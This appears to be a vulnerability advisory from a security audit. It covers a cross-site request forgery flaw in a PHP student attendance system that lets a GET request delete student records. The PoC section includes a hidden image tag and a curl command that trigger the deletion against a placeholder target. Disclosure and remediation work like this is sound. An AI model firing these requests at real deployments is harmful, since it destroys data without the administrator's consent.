# VULN-05 — Cross-Site Request Forgery - Student Deletion via GET (delete_student.php / manage_students.php)

> **Audit by:** EVA Security Research
> **Product:** Smart Attendance System with QR Code Scanner (SourceCodester #18702), v1.0 — PHP/MySQL (PDO), developer Gon13
> **Audit date:** 2026-10-17 | **Verification:** local deployment, PHP 7.3.4 + MySQL 5.7.26

## 1. Vulnerability Overview / Summary
Student deletion is performed by a plain GET request with no CSRF token and no confirmation POST. A third-party page can make an authenticated administrator's browser issue the request and silently delete any student record (cascading to their attendance history).

## 2. Affected Component & Version
- **Component:** `delete_student.php (lines 6-18), manage_students.php (lines 7-13, link line 120)`
- **Product:** Smart Attendance System with QR Code Scanner (SourceCodester #18702), v1.0. No patched version exists.

## 3. Vulnerability Type & Risk Level
- **Class (VulDB):** Cross Site Request Forgery
- **CWE-352: Cross-Site Request Forgery**
- **Severity:** Medium
- **CVSS 3.1 vector:** `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N` — **4.3**

## 4. Vulnerability Location (file:line)
```php
// delete_student.php
require 'includes/auth.php';
if (isset($_GET['id'])) {                 // line 6 - state change via GET
    $id = $_GET['id'];
    ...
    $del = $pdo->prepare("DELETE FROM students WHERE id = ?");  // line 16
    $del->execute([$id]);                                       // line 17
}

// manage_students.php - same pattern, link crafted by the app itself:
<a href="?delete=<?= $stu['id'] ?>" ...>   // line 120 - no token anywhere in the app
```

## 5. Root Cause Analysis
No anti-CSRF mechanism exists in the application (no tokens, no Origin/Referer check, no custom header requirement). Destructive operations are bound to GET, which browsers issue without user consent when embedded in third-party pages.

## 6. Preconditions
The victim administrator must be logged in and load an attacker-controlled page (or the attacker can make the admin's browser issue the GET via the stored XSS in VULN-04).

## 7. Reproduction Steps
1. Log in as administrator (session cookie set).
2. From any third-party page, cause the browser to GET delete_student.php?id=<id> (img/iframe/fetch).
3. The record is deleted and the admin is redirected to the dashboard - no confirmation, no token.

## 8. PoC / EXP
```bash
<!-- hosted on attacker site; fires when a logged-in admin visits -->
<img src="http://<TARGET>/delete_student.php?id=2" width="0" height="0">

# or plain: curl -b admin.jar "http://<TARGET>/delete_student.php?id=2"
```

## 9. Verification Results
Executed against the local deployment with an authenticated session only (no token of any kind):

  GET /smart_attendance/delete_student.php?id=2  -> 302 -> index.php
  DB: students rows for the target code: 1 -> 0 (record and cascaded logs removed)

## 10. Impact
Silent destruction of student records and their attendance history (ON DELETE CASCADE) by any page the admin visits; at scale, an attacker can wipe the student directory. Combined with VULN-04 (stored XSS) the CSRF can be triggered from within the application itself.

## 11. Remediation
```php
php// 1) Destructive actions must be POST + token
if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(405); exit; }
if (!hash_equals($_SESSION['csrf_token'] ?? '', $_POST['csrf'] ?? '')) { http_response_code(403); exit; }

// 2) Same-origin enforcement
if (!in_array($_SERVER['HTTP_ORIGIN'] ?? '', ['http://<TARGET>'], true)) { http_response_code(403); exit; }
```
- Change links to POST forms with a confirmation dialog.

## 12. References & Timeline
- **Audit by:** EVA Security Research
- **Identification:** 2026-10-17
- **Vendor notification:** not yet sent (SourceCodester is a distribution portal; no vendor patch process exists)
- **CVE:** TBD (submission package for the VulDB workflow)
